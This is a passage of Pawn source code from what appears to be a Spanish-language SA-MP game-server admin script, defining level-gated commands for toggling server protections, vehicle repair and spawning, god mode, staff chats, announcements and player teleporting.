}
CMD:nivel6(playerid,params[]){
	#pragma unused params
	cmd_level6(playerid, "\1");
	return 1;
}
CMD:nivel7(playerid,params[]){
	#pragma unused params
	cmd_level7(playerid, "\1");
	return 1;
}
CMD:nivel8(playerid,params[]){
	#pragma unused params
	cmd_level8(playerid, "\1");
	return 1;
}
CMD:nivel9(playerid,params[]){
	#pragma unused params
	cmd_level9(playerid, "\1");
	return 1;
}
CMD:nivel10(playerid,params[]){
	#pragma unused params
	cmd_level10(playerid, "\1");
	return 1;
}
CMD:infoadmin(playerid,params[]) {
	#pragma unused params
	return ShowPlayerDialog(playerid,2014,DIALOG_STYLE_MSGBOX, "{FF0000}INFO ADMIN", "{FF0000}*{FFFFFF} Respetar las reglas.\n{FF0000}*{FFFFFF} Ser muy activo en el server.\n{FF0000}*{FFFFFF} Tener mas de 25 horas registradas.\n{FF0000}*{FFFFFF} No usar mods/hacks.\n{FF0000}*{FFFFFF} Tener experiencia.\n{FF0000}*{FFFFFF} Ser vip nivel 1.\n{FF0000}*{FFFFFF} Ayudar a todos los usuarios.\n{FF0000}*{FFFFFF} Hacer publicidad del server (En servers con muchos players xD)", "Aceptar", "");
}
CMD:infovip(playerid,params[]) {
	#pragma unused params
	return ShowPlayerDialog(playerid,2014,DIALOG_STYLE_MSGBOX, "{FF0000}INFO VIP", "{FF0000}*{FFFFFF} Respetar las reglas.\n{FF0000}*{FFFFFF} Ser muy activo en el server.\n{FF0000}*{FFFFFF} Siempre ayudar a los nuevos usuarios.\n{FF0000}*{FFFFFF} Hacer publicidad del server (En servers con muchos players xD).\n\n{FFFFFF}Score necesario para ser VIP:\n\n{00FF00}Nivel 1:\t {FFFFFF}1.500 Score.\n{FFFF00}Nivel 2:\t {FFFFFF}3.000 Score.\n{00BFFF}Nivel 3:\t {FFFFFF}10.000 Score.", "Aceptar", "");
}

CMD:disable(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 7 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) {
			SendClientMessage(playerid,red,"|Usa| »{EAEAEA} /Disable [AntiSwear /NameKick /AntiSpam /Ping /ReadCmds /ReadPms /Caps /AdminCmdmsgs");
			return SendClientMessage(playerid,red,"{EAEAEA}/ConnectMsgs /AutoLogin ]");
		}
	    new string[128], file[256]; format(file,sizeof(file),"ladmin/config/Config.ini");
		if(strcmp(params,"antiswear",true) == 0) {
			ServerInfo[AntiSwear] = 0;
			dini_IntSet(file,"AntiSwear",0);
			format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha deshabilitado el antiswear.", PlayerName2(playerid));
			SaveToFile("DisableLog",string);
			SendClientMessageToAll(red,string);
		} else if(strcmp(params,"namekick",true) == 0) {
			ServerInfo[NameKick] = 0;
			dini_IntSet(file,"NameKick",0);
			format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} %s ha deshabilitado el namekick.", PlayerName2(playerid));
			SaveToFile("DisableLog",string);
			SendClientMessageToAll(red,string);
	 	} else if(strcmp(params,"antispam",true) == 0)	{
			ServerInfo[AntiSpam] = 0;
			dini_IntSet(file,"AntiSpam",0);
			format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} %s ha deshabilitado el antispam.", PlayerName2(playerid));
			SaveToFile("DisableLog",string);
			SendClientMessageToAll(red,string);
		} else if(strcmp(params,"ping",true) == 0)	{
			ServerInfo[MaxPing] = 0;
			dini_IntSet(file,"MaxPing",0);
			format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha deshabilitado el ping kick.", PlayerName2(playerid));
			SaveToFile("DisableLog",string);
			SendClientMessageToAll(red,string);
		} else if(strcmp(params,"readcmds",true) == 0) {
			ServerInfo[ReadCmds] = 0;
			dini_IntSet(file,"ReadCMDs",0);
			format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha deshabilitado el reading commands.", PlayerName2(playerid));
			SaveToFile("DisableLog",string);
			MessageToAdmins(red,string);
		} else if(strcmp(params,"readpms",true) == 0) {
			ServerInfo[ReadPMs] = 0;
			dini_IntSet(file,"ReadPMs",0);
			format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha deshabilitado el reading pms.", PlayerName2(playerid));
			SaveToFile("DisableLog",string);
			MessageToAdmins(red,string);
  		} else if(strcmp(params,"caps",true) == 0)	{
			ServerInfo[NoCaps] = 1;
			dini_IntSet(file,"NoCaps",1);
			format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha deshabilitado el captial letters in chat.", PlayerName2(playerid));
			SaveToFile("DisableLog",string);
			SendClientMessageToAll(red,string);
		} else if(strcmp(params,"admincmdmsgs",true) == 0) {
			ServerInfo[AdminCmdMsg] = 0;
			dini_IntSet(file,"AdminCMDMessages",0);
			format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha deshabilitado el admin command messages.", PlayerName2(playerid));
			SaveToFile("DisableLog",string);
			MessageToAdmins(red,string);
		} else if(strcmp(params,"connectmsgs",true) == 0)	{
			ServerInfo[ConnectMessages] = 0;
			dini_IntSet(file,"ConnectMessages",0);
			format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha deshabilitado el connect & disconnect messages.", PlayerName2(playerid));
			SaveToFile("DisableLog",string);
			MessageToAdmins(red,string);
		} else if(strcmp(params,"autologin",true) == 0)	{
			ServerInfo[AutoLogin] = 0;
			dini_IntSet(file,"AutoLogin",0);
			format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha deshabilitado el auto login.", PlayerName2(playerid));
			SaveToFile("DisableLog",string);
			MessageToAdmins(red,string);
		} else {
			SendClientMessage(playerid,red,"|Usa| »{EAEAEA} /Disable [AntiSwear /NameKick /AntiSpam /Ping /ReadCmds /ReadPms /Caps /Cmdmsg ]");
		} return 1;
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 7{EAEAEA} para usar este comando.");
}

CMD:enable(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 7 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) {
			SendClientMessage(playerid,red,"|Usa| »{EAEAEA} /Enable [AntiSwear /NameKick /AntiSpam /Ping /ReadCmds /ReadPms /Caps /AdminCmdMsgs");
			return SendClientMessage(playerid,red,"{EAEAEA}/ConnectMsgs /AutoLogin ]");
		}
	    new string[128], file[256]; format(file,sizeof(file),"ladmin/config/Config.ini");
		if(strcmp(params,"antiswear",true) == 0) {
			ServerInfo[AntiSwear] = 1;
			dini_IntSet(file,"AntiSwear",1);
			format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha habilitado el antiswear.", PlayerName2(playerid));
			SaveToFile("EnableLog",string);
			SendClientMessageToAll(red,string);
		} else if(strcmp(params,"namekick",true) == 0)	{
			ServerInfo[NameKick] = 1;
			format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha habilitado el namekick.", PlayerName2(playerid));
			SaveToFile("EnableLog",string);
			SendClientMessageToAll(red,string);
 		} else if(strcmp(params,"antispam",true) == 0)	{
			ServerInfo[AntiSpam] = 1;
			dini_IntSet(file,"AntiSpam",1);
			format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha habilitado el antispam.", PlayerName2(playerid));
			SaveToFile("EnableLog",string);
			SendClientMessageToAll(red,string);
		} else if(strcmp(params,"ping",true) == 0)	{
			ServerInfo[MaxPing] = 800;
			dini_IntSet(file,"MaxPing",800);
			format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha habilitado el ping kick.", PlayerName2(playerid));
			SaveToFile("EnableLog",string);
			SendClientMessageToAll(red,string);
		} else if(strcmp(params,"readcmds",true) == 0)	{
			ServerInfo[ReadCmds] = 1;
			dini_IntSet(file,"ReadCMDs",1);
			format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha habilitado el reading commands.", PlayerName2(playerid));
			SaveToFile("EnableLog",string);
			MessageToAdmins(red,string);
		} else if(strcmp(params,"readpms",true) == 0) {
			ServerInfo[ReadPMs] = 1;
			dini_IntSet(file,"ReadPMs",1);
			format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha habilitado el reading pms.", PlayerName2(playerid));
			SaveToFile("EnableLog",string);
			MessageToAdmins(red,string);
		} else if(strcmp(params,"caps",true) == 0)	{
			ServerInfo[NoCaps] = 0;
			dini_IntSet(file,"NoCaps",0);
			format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha habilitado el captial letters in chat.", PlayerName2(playerid));
			SaveToFile("EnableLog",string);
			SendClientMessageToAll(red,string);
		} else if(strcmp(params,"admincmdmsgs",true) == 0)	{
			ServerInfo[AdminCmdMsg] = 1;
			dini_IntSet(file,"AdminCmdMessages",1);
			format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha habilitado el admin command messages.", PlayerName2(playerid));
			SaveToFile("EnableLog",string);
			MessageToAdmins(red,string);
		} else if(strcmp(params,"connectmsgs",true) == 0) {
			ServerInfo[ConnectMessages] = 1;
			dini_IntSet(file,"ConnectMessages",1);
			format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha habilitado el connect & disconnect messages.", PlayerName2(playerid));
			SaveToFile("EnableLog",string);
			MessageToAdmins(red,string);
		} else if(strcmp(params,"autologin",true) == 0) {
			ServerInfo[AutoLogin] = 1;
			dini_IntSet(file,"AutoLogin",1);
			format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha habilitado el auto login.", PlayerName2(playerid));
			SaveToFile("EnableLog",string);
			MessageToAdmins(red,string);
		} else {
			SendClientMessage(playerid,red,"|Usa| »{EAEAEA} /Enable [AntiSwear /NameKick /AntiSpam /Ping /ReadCmds /ReadPms /Caps /CmdMsg ]");
		} return 1;
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 7{FFFFFF} para usar este comando.");
}

CMD:reparar(playerid,params[]) {
	#pragma unused params
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER)
	{
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} No eres el conductor.");
		return 1;
	}
	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
 		if(GetPlayerMoney(playerid)<2500)return SendClientMessage(playerid,red,"|Error|»{EAEAEA} No posees dinero suficiente para reparar tu vehiculo.");
		RepairVehicle(GetPlayerVehicleID(playerid));
		SetVehicleHealth(GetPlayerVehicleID(playerid),1000.0);
		PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
		GivePlayerMoney(playerid, -2500);
		GameTextForPlayer(playerid, "~n~~n~~n~~n~~n~~n~~r~-2500", 3000, 3);
	}
	else
	{
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} No estás en un vehiculo.");
	}
	return 1;
}
CMD:voltear(playerid,params[]) {
	#pragma unused params
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER)
	{
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} No eres el conductor.");
		return 1;
	}
	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
	    if(GetPlayerMoney(playerid)<2500)return SendClientMessage(playerid,red,"|Error|»{EAEAEA} No posees dinero suficiente para voltear tu vehiculo.");
			new Float:PX, Float:PY, Float:PZ, Float:PA;
			GetPlayerPos(playerid, PX, PY, PZ);
			GetVehicleZAngle(GetPlayerVehicleID(playerid), PA);
			SetVehiclePos(GetPlayerVehicleID(playerid), PX, PY, PZ+1);
			SetVehicleZAngle(GetPlayerVehicleID(playerid), PA);
			PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
			GivePlayerMoney(playerid, -2500);
			GameTextForPlayer(playerid, "~n~~n~~n~~n~~n~~n~~r~-2500", 3000, 3);
	}
	else
	{
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} No estás en un vehiculo.");
	}
	return 1;
}

CMD:car(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 4 || IsPlayerAdmin(playerid)) {
	    new tmp[128], tmp2[128], tmp3[128], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index); tmp3 = strtok(params,Index);
	    if(isnull(tmp)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /Car [Modelo/Nombre] [Color1] [Color2]");
		new car, colour1, colour2, string[100];
   		if(!IsNumeric(tmp)) car = GetVehicleModelIDFromName(tmp); else car = strval(tmp);
		if(car < 400 || car > 611) return  SendClientMessage(playerid, red, "|Error| »{EAEAEA} Modelo de vehiculo no encontrado.");
		if(isnull(tmp2)) colour1 = random(126); else colour1 = strval(tmp2);
		if(isnull(tmp3)) colour2 = random(126); else colour2 = strval(tmp3);
		CMDMessageToAdmins(playerid,"/Car");
		new LVehicleID,Float:X,Float:Y,Float:Z, Float:Angle,int1;	GetPlayerPos(playerid, X,Y,Z);	GetPlayerFacingAngle(playerid,Angle);   int1 = GetPlayerInterior(playerid);
		LVehicleID = CreateVehicle(car, X+3,Y,Z, Angle, colour1, colour2, -1); LinkVehicleToInterior(LVehicleID,int1);
		format(string, sizeof(string), "|Info| »{EAEAEA} Has aparecido un %s [ID: %d].", VehicleName[car-400], car, colour1, colour2);
		PutPlayerInVehicle(playerid, LVehicleID, 0);
		VehicleInfo[LVehicleID][Temp] = 1;
		return SendClientMessage(playerid,red, string);
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 4{EAEAEA} para usar este comando.");
}

CMD:carhealth(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 4 || IsPlayerAdmin(playerid)) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /CarHealth [JugadorID] [Cantidad]");
		new player1 = strval(tmp), health = strval(tmp2), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
            if(IsPlayerInAnyVehicle(player1)) {
		       	CMDMessageToAdmins(playerid,"/CarHealth");
				format(string, sizeof(string), "|Info| »{EAEAEA} Has puesto la vida del vehiculo de {0080FF}%s{EAEAEA} en {FF0000}%d.", pName(player1), health); SendClientMessage(playerid,red,string);
				if(player1 != playerid) { format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha puesto la vida de tu vehiculo en {FF0000}%d.", pName(playerid), health); SendClientMessage(player1,red,string); }
   				return SetVehicleHealth(GetPlayerVehicleID(player1), health);
			} else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} El jugador no esta en un vehiculo.");
	    } else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} ID no encontrada.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 4{EAEAEA} para usar este comando.");
}

CMD:carcolour(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 1 || IsPlayerAdmin(playerid)) {
		new tmp[256], tmp2[256], tmp3[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index); tmp3 = strtok(params,Index);
		if(isnull(tmp) || isnull(tmp2) || isnull(tmp3) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /CarColour [JugadorID] [Color1] [Color2]");
		new player1 = strval(tmp), colour1, colour2, string[138];
		if(!strlen(tmp2)) colour1 = random(126); else colour1 = strval(tmp2);
		if(!strlen(tmp3)) colour2 = random(126); else colour2 = strval(tmp3);
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
		if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			if(IsPlayerInAnyVehicle(player1)) {
				CMDMessageToAdmins(playerid,"/CarColour");
				if(onsys[GetPlayerVehicleID(player1)] == 1) {
		        SaveColors(GetPlayerVehicleID(player1),colour1,colour2); }
				format(string, sizeof(string), "|Info| »{EAEAEA} Has cambiado el color del {FF0000}%s{EAEAEA} de {0080FF}%s{EAEAEA} a {EAEAEA}%d, %d.", VehicleName[GetVehicleModel(GetPlayerVehicleID(player1))-400], pName(playerid), colour1, colour2 ); SendClientMessage(playerid,red,string);
				if(player1 != playerid) { format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha cambiado el color de tu {FF0000}%s{EAEAEA} a {EAEAEA}%d, %d.", pName(playerid), VehicleName[GetVehicleModel(GetPlayerVehicleID(player1))-400], colour1, colour2 ); SendClientMessage(player1,red,string); }
				return ChangeVehicleColor(GetPlayerVehicleID(player1), colour1, colour2);
			} else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} El jugador no esta en un vehiculo.");
		} else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} ID no encontrada.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 1{EAEAEA} para usar este comando.");
}

CMD:god(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 7 || IsPlayerAdmin(playerid)) {
    	if(PlayerInfo[playerid][God] == 0)	{
   	    	PlayerInfo[playerid][God] = 1;
    	    SetPlayerHealth(playerid,100000);
           	GameTextForPlayer(playerid, "~w~GodMode~n~~r~Activado", 3000, 3);
			SendClientMessage(playerid, red, "|Info| »{EAEAEA} GodMode activado.");
			return CMDMessageToAdmins(playerid,"/God");
		} else {
   	        PlayerInfo[playerid][God] = 0;
       	    GameTextForPlayer(playerid, "~w~GodMode~n~~r~Desactivado", 3000, 3);
			SendClientMessage(playerid, red, "|Info| »{EAEAEA} GodMode desactivado.");
        	SetPlayerHealth(playerid,99.0);
		} return GivePlayerWeapon(playerid,35,0);
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 8{EAEAEA} para usar este comando.");
}

CMD:vsay(playerid,params[]) {
	#pragma unused params
	new textocolor[128];
	if(PlayerInfo[playerid][Vip] >= 1 || IsPlayerAdmin(playerid)) {
		if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /Vsay [Texto]");
		format(textocolor,sizeof(textocolor), "||VIP|| {00FF00}» %s [%i]: {FFFFFF}%s", PlayerName2(playerid),playerid, params[0] );
		return SendClientMessageToAll(red,textocolor);
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {00FF00}Nivel 1{EAEAEA} para usar este comando.");
}

CMD:asay(playerid,params[]) {
	new textocolor[128];
	if(PlayerInfo[playerid][Level] >= 1 || IsPlayerAdmin(playerid)) {
		if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /Asay [Texto]");
		format(textocolor,sizeof(textocolor), "||ADMINISTRADOR|| {0080FF}» %s [%i]: {FFFFFF}%s", PlayerName2(playerid),playerid, params[0] );
		CMDMessageToAdmins(playerid,"/Asay");
		return SendClientMessageToAll(red,textocolor);
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 1{EAEAEA} para usar este comando.");
}

CMD:asay2(playerid,params[]) {
	new textocolor[128];
	if(PlayerInfo[playerid][Level] >= 1 || IsPlayerAdmin(playerid)) {
		if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /Asay2 [Texto]");
		format(textocolor,sizeof(textocolor), "||ADMINISTRADORA|| {FF69B4}» %s [%i]: {FFFFFF}%s", PlayerName2(playerid), playerid, params[0] );
		CMDMessageToAdmins(playerid,"/Asay2");
		return SendClientMessageToAll(red,textocolor);
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 1{EAEAEA} para usar este comando.");
}

CMD:osay(playerid,params[]) {
	new textocolor[128];
	if(PlayerInfo[playerid][Level] >= 10 || IsPlayerAdmin(playerid)) {
		if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /Osay [Texto]");
		format(textocolor,sizeof(textocolor), "||DUEÑO|| {FFFF00}» %s [%i]: {FFFFFF}%s", PlayerName2(playerid),playerid, params[0] );
		return SendClientMessageToAll(red,textocolor);
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 10{EAEAEA} para usar este comando.");
}

CMD:cvip(playerid,params[]) {
	#pragma unused params
	new ChatVip[150];
	if(PlayerInfo[playerid][Vip] >= 1 || IsPlayerAdmin(playerid)) {
		if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /Cvip [Texto]");
		format(ChatVip,sizeof(ChatVip), "||CHAT-VIP||{00FF00} %s [%i]: {FFFFFF}%s",PlayerName2(playerid),playerid, params[0] );
		SaveToFile("VipChatLog",ChatVip);
		return MessageToVips(red,ChatVip);
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {00FF00}Nivel 1{EAEAEA} para usar este comando.");
}

CMD:cadmin(playerid,params[]) {
	new ChatAdmin[150];
	if(PlayerInfo[playerid][Level] >= 1 || IsPlayerAdmin(playerid)) {
		if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /Cadmin [Texto]");
		format(ChatAdmin,sizeof(ChatAdmin), "||CHAT-ADMIN||{0080FF} %s [%i]: {FFFFFF}%s",PlayerName2(playerid),playerid, params[0] );
		CMDMessageToAdmins(playerid,"/Cadmin");
		SaveToFile("AdminChatLog",ChatAdmin);
		return MessageToAdmins(red,ChatAdmin);
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 1{EAEAEA} para usar este comando.");
}

CMD:cowner(playerid,params[]) {
	new ChatOwner[150];
	if(PlayerInfo[playerid][Level] >= 10 || IsPlayerAdmin(playerid)) {
		if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /Cowner [Texto]");
		format(ChatOwner,sizeof(ChatOwner), "||CHAT-OWNER|| {FFFF00}%s [%i]: {FFFFFF}%s",PlayerName2(playerid),playerid, params[0] );
		SaveToFile("OwnerChatLog",ChatOwner);
		return MessageToOwners(red,ChatOwner);
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 10{EAEAEA} para usar este comando.");
}

CMD:setping(playerid,params[])
{
     #pragma unused params
     SendClientMessage(playerid, red, "{FF0000}|Error| »{EAEAEA} Este comando ha sido desactivado por seguridad.");
     return 1;
}

CMD:setgravity(playerid,params[]) {
     #pragma unused params
     SendClientMessage(playerid, red, "{FF0000}|Error| »{EAEAEA} Este comando ha sido desactivado por seguridad.");
     return 1;
}

CMD:lcredits(playerid,params[]) {
	#pragma unused params
	return ShowPlayerDialog(playerid,2014,DIALOG_STYLE_MSGBOX, "{FF0000}Creditos (Ladmin v4)", "{FFFFFF}Creado por {0080FF}Lethal\n{FFFFFF}Editado por {A9A9A9}Psicoloco", "Aceptar", "");
}

CMD:creditos(playerid,params[]) {
	#pragma unused params
	return ShowPlayerDialog(playerid,2014,DIALOG_STYLE_MSGBOX, "{FF0000}Creditos (SATDM v9)", "{FFFFFF}Creado por {0080FF}Psicoloco(SATDM)\n{FFFFFF}GM BASE de {A9A9A9}Moneypimp\n{FFFFFF}Sistema de neones por {A9A9A9}wizzi\n Mapeos: {A9A9A9}Psicoloco y de otras paginas de SAMP", "Aceptar", "");
}

CMD:announce(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 1 || IsPlayerAdmin(playerid)) {
		if(isnull(params)) return SendClientMessage(playerid,red,"|Usa| »{EAEAEA} /Announce [Texto]");
		if(!IsValidAnnounce(params)) return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Signos no permitidos.");
		CMDMessageToAdmins(playerid,"/Announce");
		return GameTextForAll(params,5000,3);
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 1{EAEAEA} para usar este comando.");
}

CMD:announce2(playerid,params[]) {
	new playername[50];
	GetPlayerName(playerid, playername, 20);
	new Announce[100];
	if(PlayerInfo[playerid][Level] >= 1 || IsPlayerAdmin(playerid)) {
		if(isnull(params)) return SendClientMessage(playerid,red,"|Usa| »{EAEAEA} /Announce2 [Texto]");
		if(!IsValidAnnounce(params)) return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Signos no permitidos.");
		format(Announce,sizeof(Announce),"~y~%s:~n~~w~%s", playername, params);
		CMDMessageToAdmins(playerid,"/Announce2");
		return GameTextForAll(Announce,5000,3);
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 1{EAEAEA} para usar este comando.");
}

CMD:announce3(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 2 || IsPlayerAdmin(playerid)) {
		new tmp[256], tmp2[256], tmp3[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index) ,tmp3 = strtok(params,Index);
		if(isnull(tmp)||isnull(tmp2)||isnull(tmp3)) return SendClientMessage(playerid,red,"|Usa| »{FFFFFF} /Announce3 [Estilo] [Tiempo] [Texto]");
		if(!(strval(tmp) >= 0 && strval(tmp) <= 6) || strval(tmp) == 2)	return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Estilo de texto invalido. Range: [0-6]");
		if(!IsValidAnnounce(params)) return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Signos no permitidos.");
		CMDMessageToAdmins(playerid,"/Announce3");
		return GameTextForAll(params[(strlen(tmp)+strlen(tmp2)+2)], strval(tmp2), strval(tmp));
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 2{EAEAEA} para usar este comando.");
}

CMD:announce4(playerid,params[]) {
	new Announce[500];
	if(PlayerInfo[playerid][Level] >= 3 || IsPlayerAdmin(playerid)) {
		if(isnull(params)) return SendClientMessage(playerid,red,"|Usa| »{EAEAEA} /Announce4 [Texto]");
			for(new i = 0; i < MAX_PLAYERS; i++)
 	    	{
	    		format(Announce, sizeof(Announce), "http://audio1.spanishdict.com/audio?lang=es&voice=Ximena&speed=25&text=%s", params);
	    		PlayAudioStreamForPlayer(i, Announce, 0, 0, 0, 0, 0);
			}
		return CMDMessageToAdmins(playerid,"/Announce4");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 3{EAEAEA} para usar este comando.");
}


CMD:destroycar(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 4) return EraseVehicle(GetPlayerVehicleID(playerid));
	else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 4{EAEAEA} para usar este comando.");
}

CMD:teleplayer(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 4 || IsPlayerAdmin(playerid)) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /TelePlayer [JugadorID 1] hacia [JugadorID 2]");
		new player1 = strval(tmp), player2 = strval(tmp2), string[128], Float:plocx,Float:plocy,Float:plocz;
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
	 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
 		 	if(IsPlayerConnected(player2) && player2 != INVALID_PLAYER_ID) {
	 		 	CMDMessageToAdmins(playerid,"/TelePlayer");
				GetPlayerPos(player2, plocx, plocy, plocz);
				new intid = GetPlayerInterior(player2);	SetPlayerInterior(player1,intid);
				SetPlayerVirtualWorld(player1,GetPlayerVirtualWorld(player2));
				if (GetPlayerState(player1) == PLAYER_STATE_DRIVER)
				{
					new VehicleID = GetPlayerVehicleID(player1);
					SetVehiclePos(VehicleID, plocx, plocy+4, plocz); LinkVehicleToInterior(VehicleID,intid);
					SetVehicleVirtualWorld(VehicleID, GetPlayerVirtualWorld(player2) );
				}
				else SetPlayerPos(player1,plocx,plocy+2, plocz);
				format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha transportado a {0080FF}%s{EAEAEA} hacia {0080FF}%s.", pName(playerid), pName(player1), pName(player2) );
				format(string,sizeof(string),"|Info| »{EAEAEA} Has transportado a {0080FF}%s{EAEAEA} hacia {0080FF}%s.", pName(player1), pName(player2) );
 		 	    return SendClientMessage(playerid,red,string);
 		 	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} El jugador 2 no esta conectado.");
		} else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} ID no encontrada.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 4{EAEAEA} para usar este comando.");
}
